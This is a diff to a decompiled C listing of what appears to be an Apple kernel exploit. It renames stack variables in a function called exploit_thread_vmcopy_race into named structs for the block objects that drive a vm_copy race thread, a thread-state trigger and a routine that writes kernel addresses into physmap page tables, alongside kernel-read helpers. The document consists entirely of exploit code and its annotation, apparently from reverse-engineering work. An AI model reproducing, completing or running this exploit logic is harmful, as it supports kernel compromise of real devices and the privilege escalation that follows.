@@ -10511,6 +10511,46 @@ __int64 __fastcall call_vtable_ptr_slot2(__int64 a1)
 //----- (00000000000111C0) ----------------------------------------------------
 __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
 {
+  struct vmcopy_race_thread_block
+  {
+    uint64_t isa;
+    uint64_t flags;
+    void *invoke;
+    void *descriptor;
+    __int64 *state;
+    thread_act_t *targetThread;
+    __int128 *threadList;
+    semaphore_t readySemaphore;
+    semaphore_t resumeSemaphore;
+  };
+  struct vmcopy_write_physmap_block
+  {
+    uint64_t isa;
+    uint64_t flags;
+    __int64 (__fastcall *invoke)(__int64, unsigned __int8);
+    void *descriptor;
+    __int64 ctx;
+    __int64 kaddr;
+    unsigned __int64 pteIndex;
+    unsigned __int64 pteAddr;
+    unsigned __int64 pageTableBase;
+    vm_size_t size;
+    __int64 savedNext;
+    __int64 savedPrev;
+    int pageShift;
+    mem_entry_name_port_t objectHandle;
+  };
+  struct vmcopy_trigger_thread_block
+  {
+    uint64_t isa;
+    uint64_t flags;
+    void *invoke;
+    void *descriptor;
+    __int64 ctx;
+    __int64 *state;
+    semaphore_t readySemaphore;
+    semaphore_t resumeSemaphore;
+  };
   __int64 *v2; // x20
   unsigned __int64 v3; // x24
   __int64 v4; // x0
@@ -10616,28 +10656,12 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
   vm_offset_t v108; // [xsp+F0h] [xbp-610h]
   unsigned __int64 v109; // [xsp+F8h] [xbp-608h]
   vm_address_t v110; // [xsp+100h] [xbp-600h] BYREF
-  uint64_t v111[6]; // [xsp+108h] [xbp-5F8h] BYREF
-  semaphore_t v112; // [xsp+138h] [xbp-5C8h]
-  semaphore_t v113; // [xsp+13Ch] [xbp-5C4h]
+  struct vmcopy_trigger_thread_block triggerThreadBlock; // [xsp+108h] [xbp-5F8h] BYREF
   natural_t suspendedThreadState[0x44]; // [xsp+140h] [xbp-5C0h] BYREF
-  uint64_t v131[2]; // [xsp+250h] [xbp-4B0h] BYREF
-  __int64 (__fastcall *v132)(__int64, unsigned __int8); // [xsp+260h] [xbp-4A0h]
-  void *v133; // [xsp+268h] [xbp-498h]
-  __int64 v134; // [xsp+270h] [xbp-490h]
-  __int64 v135; // [xsp+278h] [xbp-488h]
-  unsigned __int64 v136; // [xsp+280h] [xbp-480h]
-  unsigned __int64 v137; // [xsp+288h] [xbp-478h]
-  unsigned __int64 v138; // [xsp+290h] [xbp-470h]
-  vm_size_t v139; // [xsp+298h] [xbp-468h]
-  __int64 v140; // [xsp+2A0h] [xbp-460h]
-  __int64 v141; // [xsp+2A8h] [xbp-458h]
-  int v142; // [xsp+2B0h] [xbp-450h]
-  mem_entry_name_port_t v143; // [xsp+2B4h] [xbp-44Ch]
+  struct vmcopy_write_physmap_block writePhysmapBlock; // [xsp+250h] [xbp-4B0h] BYREF
   vm_address_t v144; // [xsp+2B8h] [xbp-448h] BYREF
   integer_t policy_info[4]; // [xsp+2C0h] [xbp-440h] BYREF
-  uint64_t v146[7]; // [xsp+2D0h] [xbp-430h] BYREF
-  semaphore_t v147; // [xsp+308h] [xbp-3F8h]
-  semaphore_t v148; // [xsp+30Ch] [xbp-3F4h]
+  struct vmcopy_race_thread_block raceThreadBlock; // [xsp+2D0h] [xbp-430h] BYREF
   pthread_t v149; // [xsp+310h] [xbp-3F0h] BYREF
   __int64 v150; // [xsp+318h] [xbp-3E8h] BYREF
   vm_address_t v151; // [xsp+320h] [xbp-3E0h] BYREF
@@ -10775,16 +10799,16 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
     v27 = v151;
     v150 = 0;
     memset(v180, 0, sizeof(v180));
-    v146[0] = _NSConcreteStackBlock;
-    v146[1] = 3221225472LL;
-    v146[2] = run_exploit_thread;
-    v146[3] = &unk_44870;
-    v147 = v160;
-    v148 = semaphore;
-    v146[4] = &v150;
-    v146[5] = &target_act;
-    v146[6] = v180;
-    pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, v146);
+    raceThreadBlock.isa = _NSConcreteStackBlock;
+    raceThreadBlock.flags = 3221225472LL;
+    raceThreadBlock.invoke = run_exploit_thread;
+    raceThreadBlock.descriptor = &unk_44870;
+    raceThreadBlock.readySemaphore = v160;
+    raceThreadBlock.resumeSemaphore = semaphore;
+    raceThreadBlock.state = &v150;
+    raceThreadBlock.targetThread = &target_act;
+    raceThreadBlock.threadList = v180;
+    pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
     semaphore_wait(semaphore);
     v28 = pthread_mach_thread_np(v149);
     *(__int128 *)policy_info = xmmword_42F00;
@@ -10967,20 +10991,20 @@ LABEL_68:
     memcpy(__dst, *(const void **)(a1 + 24), sizeof(__dst));
     v68 = kread_u64_value(*(uint64_t *)(a1 + 8), v95);
     v69 = kread_u64_value(*(uint64_t *)(a1 + 8), v65 + 8);
-    v131[0] = _NSConcreteStackBlock;
-    v131[1] = 3221225472LL;
-    v132 = write_kaddr_to_physmap;
-    v133 = &unk_44890;
-    v134 = a1;
-    v135 = v95;
-    v136 = v99;
-    v137 = v65;
-    v138 = v106;
-    v139 = size;
-    v142 = v159;
-    v143 = object_handle;
-    v140 = v69;
-    v141 = v68;
+    writePhysmapBlock.isa = _NSConcreteStackBlock;
+    writePhysmapBlock.flags = 3221225472LL;
+    writePhysmapBlock.invoke = write_kaddr_to_physmap;
+    writePhysmapBlock.descriptor = &unk_44890;
+    writePhysmapBlock.ctx = a1;
+    writePhysmapBlock.kaddr = v95;
+    writePhysmapBlock.pteIndex = v99;
+    writePhysmapBlock.pteAddr = v65;
+    writePhysmapBlock.pageTableBase = v106;
+    writePhysmapBlock.size = size;
+    writePhysmapBlock.pageShift = v159;
+    writePhysmapBlock.objectHandle = object_handle;
+    writePhysmapBlock.savedNext = v69;
+    writePhysmapBlock.savedPrev = v68;
     v70 = get_task_kobject_addr_from_field32(*(uint64_t *)(a1 + 8), v162);
     v71 = *(struct_krwCtx **)(*(uint64_t *)(a1 + 8) + 32LL);
     v72 = kread_u64_value(*(uint64_t *)(a1 + 8), qword_48008 + v70);
@@ -11035,19 +11059,19 @@ LABEL_68:
     {
       memcpy(*(void **)(a1 + 24), __dst, 0x130u);
       v150 = 0;
-      v111[0] = _NSConcreteStackBlock;
-      v111[1] = 3221225472LL;
-      v111[2] = trigger_thread_state_mod;
-      v111[3] = &unk_448B0;
-      v112 = v160;
-      v113 = semaphore;
-      v111[4] = a1;
-      v111[5] = &v150;
-      pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, v111);
+      triggerThreadBlock.isa = _NSConcreteStackBlock;
+      triggerThreadBlock.flags = 3221225472LL;
+      triggerThreadBlock.invoke = trigger_thread_state_mod;
+      triggerThreadBlock.descriptor = &unk_448B0;
+      triggerThreadBlock.readySemaphore = v160;
+      triggerThreadBlock.resumeSemaphore = semaphore;
+      triggerThreadBlock.ctx = a1;
+      triggerThreadBlock.state = &v150;
+      pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &triggerThreadBlock);
       semaphore_wait(semaphore);
       semaphore_signal(v160);
       *(uint64_t *)(*(uint64_t *)(a1 + 24) + 240LL) = 0;
-      v132((__int64)v131, 8u);
+      writePhysmapBlock.invoke((__int64)&writePhysmapBlock, 8u);
       v150 = 1;
       v79 = *(uint64_t *)(a1 + 24);
       v80 = (uint32_t *)(v79 + 272);
@@ -11060,7 +11084,7 @@ LABEL_68:
         *v81 = v48;
       }
       while ( !*v82 );
-      v132((__int64)v131, 1u);
+      writePhysmapBlock.invoke((__int64)&writePhysmapBlock, 1u);
       pthread_join(v149, 0);
       v84 = kread_u64_value(*(uint64_t *)(a1 + 8), v100 + 296);
       if ( v84 != v78 && v84 != v48 && v84 != v41 )
